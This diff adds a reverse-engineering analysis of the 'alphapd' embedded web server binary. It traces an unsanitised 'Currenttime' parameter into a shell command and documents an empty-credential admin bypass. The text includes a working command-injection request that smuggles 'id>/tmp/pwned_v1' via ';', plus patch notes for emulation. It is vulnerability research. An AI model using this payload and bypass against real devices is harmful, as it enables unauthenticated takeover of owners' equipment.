@@ -1,0 +1,64 @@
+=== IDA Pro 9.2 Hex-Rays Decompilation: websKernalParameter @ 0x413778 ===
+Binary: alphapd (MD5: b17cd8a0965c0f131b57e429a9165f6e)
+
+Key instruction flow (from disassembly):
+
+0x4137b0: la      $t9, websTestVar
+0x4137b4: addiu   $a1, $s4, (aCurrenttime - 0x470000)  # "Currenttime"
+0x4137b8: jalr    $t9                                  # call websTestVar(a1, "Currenttime")
+0x4137c4: bnez    $v0, loc_41383C                       # if Currenttime present, jump to process
+                                                        # (PATCHED: bnez -> b to always process)
+
+0x413898: la      $t9, localtime
+0x4138a0: jalr    $t9                                  # call localtime()
+0x4138b0: la      $t9, getSysInfoBuffer
+0x4138cc: jalr    $t9                                  # call getSysInfoBuffer(4) — reads /dev/gpio
+                                                        # (QEMU: returns empty, real hw: returns stored date)
+
+0x413934: bne     $s1, $s0, loc_4137CC                 # year comparison: if current != stored, exit
+                                                        # (PATCHED: bne -> nop to skip check)
+0x41393c: beqz    $v0, loc_413A94                      # month/day comparison
+                                                        # (PATCHED: beqz -> nop to skip check)
+
+0x413948: la      $t9, websGetVar
+0x41394c: addiu   $a1, $s4, (aCurrenttime - 0x470000)  # "Currenttime"
+0x413954: jalr    $t9                                  # call websGetVar(a1, "Currenttime", "")
+                                                        # → returns user-controlled value with NO FILTERING
+
+0x4139a4: la      $t9, sprintf
+0x4139b0: addiu   $a1, $s1, (aDateSS - 0x470000)       # "date -s %s &"
+0x4139bc: jalr    $t9                                  # sprintf(buf, "date -s %s &", Currenttime)
+                                                        # VULNERABLE: no escaping of Currenttime
+
+0x4139cc: la      $t9, doSystem
+0x4139d4: jalr    $t9                                  # doSystem(buf) → system("date -s <Currenttime> &")
+                                                        # SINK: command execution with attacker input
+
+=== Vulnerability Analysis ===
+
+Root Cause: websGetVar("Currenttime") returns user-supplied HTTP query parameter
+with no sanitization. This value is formatted directly into a shell command string
+via sprintf("date -s %s &", Currenttime), then passed to doSystem() which calls system().
+
+Attack Vector: GET /home.htm?Currenttime=2027-09-22;id>/tmp/pwned_v1
+  → system("date -s 2027-09-22;id>/tmp/pwned_v1 &")
+  → shell splits on ';': executes "date -s 2027-09-22" then "id>/tmp/pwned_v1"
+
+Auth Bypass (websCheckRealm @ 0x414e3c):
+  Decompiled logic:
+    v2 = nvram_bufget(0, "AdminID");      // stored admin ID
+    v4 = nvram_bufget(0, "AdminPassword"); // stored admin password
+    if (!*v2 && !*v4) {                   // if BOTH empty
+        a1[44] = 3;                       // grant auth level 3 (admin)
+        goto LABEL_4;                     // skip authentication
+    }
+
+  When AdminID and AdminPassword are empty (factory default state),
+  the function grants admin-level access (level 3) without any credentials.
+  This makes V1 an UNAUTHENTICATED RCE on devices with default configuration.
+
+Patches for QEMU verification:
+  The 3 NOP patches bypass the year/month/day comparison that requires
+  getSysInfoBuffer(4) to return a valid stored date from /dev/gpio hardware.
+  QEMU user-mode cannot emulate /dev/gpio, so the comparison always fails.
+  On real hardware, these patches are NOT needed — /dev/gpio works normally.
